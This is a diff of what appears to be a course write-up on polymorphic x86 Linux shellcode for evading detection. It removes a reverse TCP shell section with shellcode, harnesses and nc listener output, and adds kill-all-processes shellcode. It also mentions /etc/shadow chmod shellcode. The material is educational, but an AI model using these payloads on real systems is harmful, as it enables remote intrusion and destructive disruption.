@@ -31,7 +31,7 @@ Polymorphic encoders such as Shikata-Ga-Nai can be used in this scenario to evad
 The 3 Shell-Storm references that will be modified:
 
 * Execve <code class="language-plaintext highlighter-rouge">/bin/sh</code> 
-* Reverse TCP Shell 
+* Killall processes 
 * Chmod <code class="language-plaintext highlighter-rouge">/etc/shadow</code>  
 
 #### 1st Shellcode (Execve /bin/sh)
@@ -211,115 +211,54 @@ $
 
 The polymorphic version of the shellcode is 32% larger in size compared to the original reference from Shell-Storm.
 
-#### 2nd Shellcode (Reverse TCP Shell)
+#### 2nd Shellcode (Killall Processes)
 --------------
 
-A Reverse TCP shell initiates a connection from the target host back to the attacker’s IP address and listening port, executing a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell on the target host’s machine.
+A Killall command on a Linux based system will literally terminate all running processes that are currently active on the target host’s machine.
 
-Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-849.php] [reversetcp-shellstorm]::
+Referenced from Shell-Storm [http://shell-storm.org/shellcode/files/shellcode-212.php] [killall-shellstorm]::
 
 ```c
-/*
-Title   : reversetcpbindshell  (92 bytes)
-Date    : 16 May 2013
-Author  : Russell Willis <codinguy@gmail.com>
-Testd on: Linux/x86 (SMP Debian 3.2.41-2 i686)
- 
-$ objdump -D reversetcpbindshell -M intel
-
-reversetcpbindshell:     file format elf32-i386
-
-Disassembly of section .text:
-
-08048060 <_start>:
- 8048060:       31 c0                   xor    eax,eax
- 8048062:       31 db                   xor    ebx,ebx
- 8048064:       31 c9                   xor    ecx,ecx
- 8048066:       31 d2                   xor    edx,edx
- 8048068:       b0 66                   mov    al,0x66
- 804806a:       b3 01                   mov    bl,0x1
- 804806c:       51                      push   ecx
- 804806d:       6a 06                   push   0x6
- 804806f:       6a 01                   push   0x1
- 8048071:       6a 02                   push   0x2
- 8048073:       89 e1                   mov    ecx,esp
- 8048075:       cd 80                   int    0x80
- 8048077:       89 c6                   mov    esi,eax
- 8048079:       b0 66                   mov    al,0x66
- 804807b:       31 db                   xor    ebx,ebx
- 804807d:       b3 02                   mov    bl,0x2
- 804807f:       68 c0 a8 01 0a          push   0xa01a8c0
- 8048084:       66 68 7a 69             pushw  0x697a
- 8048088:       66 53                   push   bx
- 804808a:       fe c3                   inc    bl
- 804808c:       89 e1                   mov    ecx,esp
- 804808e:       6a 10                   push   0x10
- 8048090:       51                      push   ecx
- 8048091:       56                      push   esi
- 8048092:       89 e1                   mov    ecx,esp
- 8048094:       cd 80                   int    0x80
- 8048096:       31 c9                   xor    ecx,ecx
- 8048098:       b1 03                   mov    cl,0x3
- 0804809a <dupfd>:
- 804809a:       fe c9                   dec    cl
- 804809c:       b0 3f                   mov    al,0x3f
- 804809e:       cd 80                   int    0x80
- 80480a0:       75 f8                   jne    804809a
- 80480a2:       31 c0                   xor    eax,eax
- 80480a4:       52                      push   edx
- 80480a5:       68 6e 2f 73 68          push   0x68732f6e
- 80480aa:       68 2f 2f 62 69          push   0x69622f2f
- 80480af:       89 e3                   mov    ebx,esp
- 80480b1:       52                      push   edx
- 80480b2:       53                      push   ebx
- 80480b3:       89 e1                   mov    ecx,esp
- 80480b5:       52                      push   edx
- 80480b6:       89 e2                   mov    edx,esp
- 80480b8:       b0 0b                   mov    al,0xb
- 80480ba:       cd 80                   int    0x80
-*/
-
-#include <stdio.h>
-
-/*
- ipaddr 192.168.1.10 (c0a8010a)
- port 31337 (7a69)
-*/
-#define IPADDR "\xc0\xa8\x01\x0a"
-#define PORT "\x7a\x69"
-
-unsigned char code[] =
-"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
-"\xb0\x66\xb3\x01\x51\x6a\x06\x6a"
-"\x01\x6a\x02\x89\xe1\xcd\x80\x89"
-"\xc6\xb0\x66\x31\xdb\xb3\x02\x68"
-IPADDR"\x66\x68"PORT"\x66\x53\xfe"
-"\xc3\x89\xe1\x6a\x10\x51\x56\x89"
-"\xe1\xcd\x80\x31\xc9\xb1\x03\xfe"
-"\xc9\xb0\x3f\xcd\x80\x75\xf8\x31"
-"\xc0\x52\x68\x6e\x2f\x73\x68\x68"
-"\x2f\x2f\x62\x69\x89\xe3\x52\x53"
-"\x89\xe1\x52\x89\xe2\xb0\x0b\xcd"
-"\x80";
+/* By Kris Katterjohn 11/13/2006
+ *
+ * 11 byte shellcode to kill all processes for Linux/x86
+ *
+ *
+ *
+ * section .text
+ *
+ *      global _start
+ *
+ * _start:
+ *
+ * ; kill(-1, SIGKILL)
+ *
+ *      push byte 37
+ *      pop eax
+ *      push byte -1
+ *      pop ebx
+ *      push byte 9
+ *      pop ecx
+ *      int 0x80
+ */
 
 main()
 {
-    printf("Shellcode Length: %d\n", sizeof(code)-1);
-    int (*ret)() = (int(*)())code;
-    ret();
+       char shellcode[] = "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";
+
+       (*(void (*)()) shellcode)();
 }
 ```
 
 The polymorphic (modified) version of the original shellcode is scripted in Assembly:
 
 ```nasm 
-; Filename: revtcpshell_poly.nasm
+; Filename: killall_poly.nasm
 ; Author: h3ll0clar1c3
-; Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 31337
-; Compilation: ./compile.sh revtcpshell_poly
-; Usage: ./revtcpshell_poly
-; Testing: nc -lv 31337
-; Shellcode size: 105 bytes
+; Purpose: Terminates processes running on the local host
+; Compilation: ./compile.sh killall_poly
+; Usage: ./killall_poly
+; Shellcode size: 15 bytes
 ; Architecture: x86
 
 global   _start
@@ -327,81 +266,35 @@ global   _start
 section .text
         _start:
 
-	sub eax, eax			; initialize register // changed the method
-	sub ebx, ebx			; initialize register // changed the method
-	sub ecx, ecx			; initialize register // changed the method
-	sub edx, edx			; initialize register // changed the method
-
-	add al, 0x66			; add 0x66 to al // changed the method
-	inc bl				; increase bl by 0x1 // changed the method
-	push ecx			; push ecx onto the stack 
-	mov byte [esp-8], 0x2		; move 0x2 into esp-8 // changed the order
-	mov byte [esp], 0x6		; move 0x6 into esp 
-	mov byte [esp-4], 0x1		; move 0x1 into esp-4
-	sub esp, 0x8			; adjust stack pointer	
-	push esp 			; push esp onto the stack
-	pop ecx				; pop ecx off the stack
-	int 0x80			; call the interrupt to execute the 1st syscall
-	mov esi, eax			; move eax into esi
-	mov al, 0x66			; move 0x66 into al
-	inc bl				; increase bl
-
-	mov dword [esp], 0x0101017f	; ip address
-	sub esp, 0x8			; substitute 0x8 with esp
-	push word 0x697a		; port
-	push bx				; push bx onto the stack
-	add bl, 0x1			; move 0x1 into bl
-	mov ecx, esp			; move esp into ecx
-	push 0x10			; push 0x10 onto the stack
-	push ecx			; push ecx onto the stack
-	push esi			; push esi onto the stack
-	push esp			; push esp onto the stack
-	pop ecx				; pop ecx off the stack
-	int 0x80			; call the interrupt to execute the 2nd syscall
-	sub ecx, ecx			; substitute ecx with ecx, initialize register
-	pop ecx				; pop ecx off the stack
-
-	loop_dup2:
-	mov al, 0x3f			; move 0x3f into al // changed the order
-	dec cl				; decrement cl
-	int 0x80			; call the interrupt to execute the 3rd syscall
-	jns loop_dup2			; repeat for 1,0
-	sub eax, eax 			; substitute eax with eax, initialize register
-	push edx			; push edx onto the stack
-	push 0x68732f6e			; push the end of "//bin/sh", 'hs/n'
-	push 0x69622f2f			; push the beginning of "//bin/sh", 'ib//'
-	push esp			; push esp onto the stack
-	pop ebx				; pop ebx off the stack
-	push edx			; push edx onto the stack
-	push ebx			; push ebx onto the stack
-	push esp 			; push esp onto the stack
-	pop ecx				; pop ecx off the stack
-	push edx			; push edx onto the stack
-	push esp			; push esp onto the stack
-	pop edx				; pop edx off the stack
-	add al, 0xb			; add 0xb to al
-	int 0x80			; call the interrupt to execute the 4th syscall
+	sub eax, eax			; initialize register // added instruction
+	mov al, 0x25			; move 0x25 into al // changed the method
+	sub ebx, ebx			; initialize register // added instruction
+	dec ebx				; decrement ebx // replaced push 0xffffffff
+	sub ecx, ecx			; initialize register // added instruction
+	mov cl, 0xf7			; move 0xf7 intocl // added instruction
+	neg cl				; negates 0xf7 // added instruction
+	int 0x80			; call the interrupt to execute the syscall
 ```
 
 The Assembly code is compiled by assembling with Nasm, and compiled as an executable binary.
 
-Objdump is used to extract the shellcode from the Reverse TCP shell in hex format (Null free):
+Objdump is used to extract the shellcode from the Killall command in hex format (Null free):
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./revtcpshell_poly | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
-"\x29\xc0\x29\xdb\x29\xc9\x29\xd2\x04\x66\xfe\xc3\x51\xc6\x44\x24\xf8\x02\xc6\x04\x24\x06\xc6\x44\x24\xfc\x01\x83\xec\x08\x54\x59\xcd\x80\x89\xc6\xb0\x66\xfe\xc3\xc7\x04\x24\x7f\x01\x01\x83\xec\x08\x66\x68\x7a\x69\x66\x53\x80\xc3\x01\x89\xe1\x6a\x10\x51\x56\x54\x59\xcd\x80\x29\xc9\x59\xb0\x3f\xfe\xc9\xcd\x80\x79\xf8\x29\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x54\x5b\x52\x53\x54\x59\x52\x54\x5a\x04\x0b\xcd\x80" 
+osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./killall_poly | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
+"\x29\xc0\xb0\x25\x29\xdb\x4b\x29\xc9\xb1\xf7\xf6\xd9\xcd\x80"
 ```
 
 A C program scripted with the newly generated shellcode:
 
 ```c 
 /**
-* Filename: revtcpshell_poly_shellcode.c
+* Filename: killall_poly_shellcode.c
 * Author: h3ll0clar1c3
-* Purpose: Reverse shell connecting back to IP address 127.0.0.1 on TCP port 31337   
-* Compilation: gcc -fno-stack-protector -z execstack -m32 revtcpshell_poly_shellcode.c -o revtcpshell_poly_final
-* Usage: ./revtcpshell_poly_final
-* Shellcode size: 105 bytes
+* Purpose: Terminates processes running on the local host   
+* Compilation: gcc -fno-stack-protector -z execstack -m32 killall_poly_shellcode.c -o killall_poly_final
+* Usage: ./killall_poly_final
+* Shellcode size: 15 bytes
 * Architecture: x86
 **/
 
@@ -409,11 +302,8 @@ A C program scripted with the newly generated shellcode:
 #include <string.h>
 
 unsigned char code[] = \
-"\x29\xc0\x29\xdb\x29\xc9\x29\xd2\x04\x66\xfe\xc3\x51\xc6\x44\x24\xf8\x02\xc6\x04\x24"
-"\x06\xc6\x44\x24\xfc\x01\x83\xec\x08\x54\x59\xcd\x80\x89\xc6\xb0\x66\xfe\xc3\xc7\x04"
-"\x24\x7f\x01\x01\x83\xec\x08\x66\x68\x7a\x69\x66\x53\x80\xc3\x01\x89\xe1\x6a\x10\x51"
-"\x56\x54\x59\xcd\x80\x29\xc9\x59\xb0\x3f\xfe\xc9\xcd\x80\x79\xf8\x29\xc0\x52\x68\x6e"
-"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x54\x5b\x52\x53\x54\x59\x52\x54\x5a\x04\x0b\xcd\x80";
+
+"\x29\xc0\xb0\x25\x29\xdb\x4b\x29\xc9\xb1\xf7\xf6\xd9\xcd\x80";
 
 int main()
 {
@@ -423,40 +313,15 @@ int main()
 }
 ```
 
-The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 105 bytes:
+The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 15 bytes:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 revtcpshell_poly_shellcode.c -o revtcpshell_poly_final
-osboxes@osboxes:~/Downloads/SLAE$ ./revtcpshell_poly_final 
-Shellcode length:  105
-Segmentation fault (core dumped)
+osboxes@osboxes:~/Downloads/SLAE$ ./killall_poly_final Connection to 192.168.0.142 closed by remote host.
+Connection to 192.168.0.142 closed.
 
 ```
 
-The polymorphic version of the shellcode is ??% larger in size compared to the original reference from Shell-Storm.
-
-
-
-
-
-
-As a POC, the C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 26 bytes:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -zexecstack reverseshell_shellcode.c -o reverseshell
-osboxes@osboxes:~/Downloads/SLAE$ ./reverseshell 
-Shellcode length:  26
-
-```
-
-A separate terminal demonstrating a successful reverse connection and shell on the local host (via port 4444):
-
-```bash
-osboxes@osboxes:~$ nc -lv 4444
-Connection from 127.0.0.1 port 4444 [tcp/*] accepted
-id
-uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
-```
+The polymorphic version of the shellcode is 36% larger in size compared to the original reference from Shell-Storm.
 
 #### 3rd Shellcode (chmod 0777 /etc/shadow)
 --------------
@@ -574,4 +439,4 @@ GitHub Repo: [Code][github-code]
 [slae-link]: http:/securitytube-training.com/online-courses/securitytube-linux-assembly-expert
 [github-code]: https://github.com/h3ll0clar1c3/SLAE/tree/master/Exam/Assignment6
 [execve-shellstorm]: http://shell-storm.org/shellcode/files/shellcode-811.php
-[reversetcp-shellstorm]: http://shell-storm.org/shellcode/files/shellcode-849.php
+[killall-shellstorm]: http://shell-storm.org/shellcode/files/shellcode-212.php
